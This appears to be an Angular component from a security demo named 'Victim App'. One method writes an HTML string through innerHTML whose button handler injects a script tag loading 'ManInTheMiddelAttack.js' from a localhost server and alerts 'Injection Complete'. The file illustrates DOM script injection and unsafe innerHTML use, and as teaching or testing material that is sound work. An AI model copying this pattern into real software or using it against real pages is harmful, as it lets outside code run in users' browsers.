import { Component } from '@angular/core';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  public static titleName = 'Victim App';
  title = AppComponent.titleName;

  myFunction() {
    debugger;
    var text = "Hello Script: <input type='button' value='Toggle Hack' "+
    " onclick=\"debugger; if(document.getElementById('SomeFlag')==undefined) "+
    " { helpfulScriptLoaded = document.createElement('script'); "+
    " helpfulScriptLoaded.src = 'http://localhost:3000/ManInTheMiddelAttack.js'; "+
    " document.body.appendChild(helpfulScriptLoaded); "+
    " someFlag = document.createElement('SomeFlag'); "+
    " someFlag.id = 'SomeFlag'; document.body.appendChild(someFlag); "+
    " alert('Injection Complete'); setTimeout( function() { newMyFunction();} , 1000); } "+
    " else newMyFunction(); \" />  Hello After"
    document.getElementById("demo").innerHTML = text;
  }

}
